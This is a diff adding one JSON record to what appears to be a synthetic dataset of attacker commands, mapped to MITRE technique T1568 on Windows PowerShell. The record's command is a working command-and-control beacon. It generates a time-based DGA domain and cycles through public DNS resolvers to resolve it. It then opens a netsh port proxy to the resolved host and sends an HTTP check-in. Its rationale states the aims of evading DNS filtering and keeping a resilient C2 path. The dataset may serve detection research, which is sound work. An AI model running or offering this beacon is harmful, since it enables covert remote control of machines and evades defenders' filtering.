@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$domain='api'+(Get-Date -Format 'yyMMddHH')+'.cloud';$dns=@('8.8.8.8','1.1.1.1','9.9.9.9');$ip=$null;$usedServer=$null;foreach($s in $dns){try{$a=Resolve-DnsName -Name $domain -Type A -Server $s -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;$usedServer=$s;break}catch{}};if($ip){netsh interface portproxy set v4tov4 listenaddress=127.0.0.1 listenport=8444 connectaddress=$ip connectport=443;Invoke-WebRequest -Uri 'http://127.0.0.1:8444/checkin' -UseBasicParsing -Headers @{DNS=$usedServer;Dom=$domain} -TimeoutSec 5}",
+  "explanation": "Cycles through multiple public DNS resolvers to obtain a current IP for a time-based DGA domain and establishes a portproxy to the dynamically resolved host.",
+  "rationale_steps": [
+    "Select an operational resolver to evade DNS filtering and ensure resolution.",
+    "Proxy local traffic to the resolved IP to maintain a resilient C2 path."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-74a9fca4",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
